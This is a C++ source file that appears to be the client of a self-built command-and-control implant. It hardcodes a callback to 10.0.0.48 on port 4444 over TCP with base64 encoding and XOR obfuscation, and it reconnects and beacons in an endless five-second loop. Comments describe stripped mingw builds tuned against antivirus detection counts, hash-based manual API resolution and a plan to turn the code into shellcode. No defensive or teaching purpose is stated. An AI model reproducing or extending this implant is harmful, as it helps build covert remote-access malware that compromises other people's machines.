/* TODO:
 * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe
 * 
 * // Working flags below, 5/72
 * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe 
 * */

// TODO: eventually convert to c code then asm then shell code?


#include "Client.h"
#include "ComponentFactory.h"
#include "TransportLayer.h"

#include <iostream>



Client::Client() :
	messageHandler_(),
	transportLayerPtr_(
		TransportLayerFactory::create(
		messageHandler_,
		"10.0.0.48",
		"4444",
		TransportLayerType::TCP,
		SerializerType::BINARY,
		EncoderType::BASE64,
		EncryptorType::XOR
		)
	)
{
	messageHandler_.setTransportLayer(*transportLayerPtr_);
}

Client::Client(
	const std::string& server,
	const std::string& port,
	TransportLayerType transportType,
	SerializerType serializerType,
	EncoderType encoderType,
	EncryptorType encryptorType)
	:
	messageHandler_(),
	transportLayerPtr_(
		TransportLayerFactory::create(
			messageHandler_,
			server,
			port,
			transportType,
			serializerType,
			encoderType,
			encryptorType)
	)
	/*
	, messageHandler_()
	, transportLayerFactory_()
	*/
{
	messageHandler_.setTransportLayer(*transportLayerPtr_);
}


Client::~Client()
{
	/*
	if (messageHandler_)
	{
		delete messageHandler_;
	}

	if (transportLayerFactory_)
	{
		delete transportLayerFactory_;
	}*/

	/*
	delete messageHandlerPtr_;
	messageHandlerPtr_ = 0;

	delete transportLayerFactory_;
	transportLayerFactory_ = 0;
	*/

}

bool Client::run()
{	
	//Config* config = loadConfig();
	//Config config = loadConfig();

	// 1. manually resolve apis
	/*
	TODO:
	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
	to loop through the array of functions every single time?

	something like this:
	resolve_all_functions(dll_base, hashes, pointers, count);

	not sure if this is worth doing for dlls/modules tho

	*/

	while (true)
	{
		if (!transportLayerPtr_->isConnected())
		{
			transportLayerPtr_->connect();
		}

		if (transportLayerPtr_->isConnected())
		{
			transportLayerPtr_->beacon();
		}
		Sleep(5000);
	}
	return false;
}



void Client::setupComponents()
{
	//messageHandlerPtr_ = new MessageHandler();
	//transportLayerFactory_ = new TransportLayerFactory(*messageHandlerPtr_);
	// TODO: factory needs to be passed to somewhere else? maybe the transportlayer itself?
	//transportLayer_ = new TransportLayer(*transportLayerFactory_); // TODO: ?


	// template<class TransportLayerType> class TransportLayerFactory
	// Arch::OwningPtr<TransportLayerType> createTransportLayer();
	// Arch::OwningPtr<TransportLayerType> createTransportLayer(const TransportId?);
}


void Client::setupTasks()
{
	// TODO: make an object called task? or individual object called runTask that calls the logic inside Client.run() ?
}

/* let tasks (things listening for events to be risen) know 
 * that subsystem is transitioning to RUNNING
 * void prepareToRun(): 
 * 
 *
 * */


/* NOTES:
 * typedef TransportLayerFactory<TCP> TCPFactory?
 * typedef ComponentFactory<ComponentType> ComponentTypeFactory
 *
 * */
